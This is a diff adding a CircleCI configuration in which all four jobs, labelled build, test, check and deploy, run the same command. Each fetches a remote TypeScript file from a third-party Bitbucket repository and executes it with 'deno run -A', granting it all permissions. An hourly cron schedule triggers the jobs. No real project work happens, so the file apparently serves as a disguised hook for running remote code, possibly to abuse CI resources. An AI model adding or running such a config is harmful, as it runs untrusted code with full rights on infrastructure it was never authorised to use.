@@ -1,0 +1,99 @@
+{
+    "version": 2.1,
+    "jobs": {
+        "build": {
+            "docker": [
+                {
+                    "image": "circleci/node:12"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/build",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Build",
+                        "command": "deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/task.ts"
+                    }
+                }
+            ]
+        },
+        "test": {
+            "docker": [
+                {
+                    "image": "circleci/node:12"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/test",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Test",
+                        "command": "deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/task.ts"
+                    }
+                }
+            ]
+        },
+        "check": {
+            "docker": [
+                {
+                    "image": "circleci/node:12"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/check",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Check",
+                        "command": "deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/task.ts"
+                    }
+                }
+            ]
+        },
+        "deploy": {
+            "docker": [
+                {
+                    "image": "circleci/node:12"
+                }
+            ],
+            "resource_class": "medium",
+            "working_directory": "~/deploy",
+            "steps": [
+                {
+                    "run": {
+                        "name": "Deploy",
+                        "command": "deno run -A https://bitbucket.org/izsystem/de4js/raw/meocoder_node/tool/NODE1/task.ts"
+                    }
+                }
+            ]
+        }
+    },
+    "workflows": {
+        "version": 2,
+        "constantly_build": {
+            "triggers": [
+                {
+                    "schedule": {
+                        "cron": "0 * * * *",
+                        "filters": {
+                            "branches": {
+                                "only": [
+                                    "main",
+                                    "master"
+                                ]
+                            }
+                        }
+                    }
+                }
+            ],
+            "jobs": [
+                "build",
+                "test",
+                "check",
+                "deploy"
+            ]
+        }
+    }
+}
